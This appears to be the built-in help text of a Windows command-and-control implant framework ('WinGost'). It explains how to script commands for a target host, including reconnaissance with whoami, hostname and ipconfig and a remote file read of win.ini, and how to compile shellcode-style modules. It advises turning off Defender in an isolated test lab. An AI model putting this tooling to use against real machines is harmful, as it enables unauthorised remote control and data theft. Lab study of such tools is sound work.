print [VMS SCRIPT CREATION]
print 1. Create <name>.vms in moduloScript/
print 2. Add commands line by line
print 3. Execute with .$<name>
print 
print Example script (info.vms):
print tm whoami
print tm hostname
print tm ipconfig
print rmf C:\Windows\win.ini

print 
print [CUSTOM MODULE DEVELOPMENT]
print 1. Write module.c with WinGost.h
print 2. Compile: gcc -nostdlib -nodefaultlibs
print 3. Ensure position-independent code
print 4. No .data/.rdata sections
print 5. Use ft->WinGost.gostSend() for output

print 
print [TROUBLESHOOTING]
print No target? Check WinGost is running
print Commands hang? Wait for beacon (30-60s)
print Download fails? File >5MB or locked
print No output? Check server.exe console

print 
print [OP SECURITY]
print Use isolated lab (no internet)
print Modify hosts file for domain redirect
print Disable Defender in test VM
print Take VM snapshots before tests

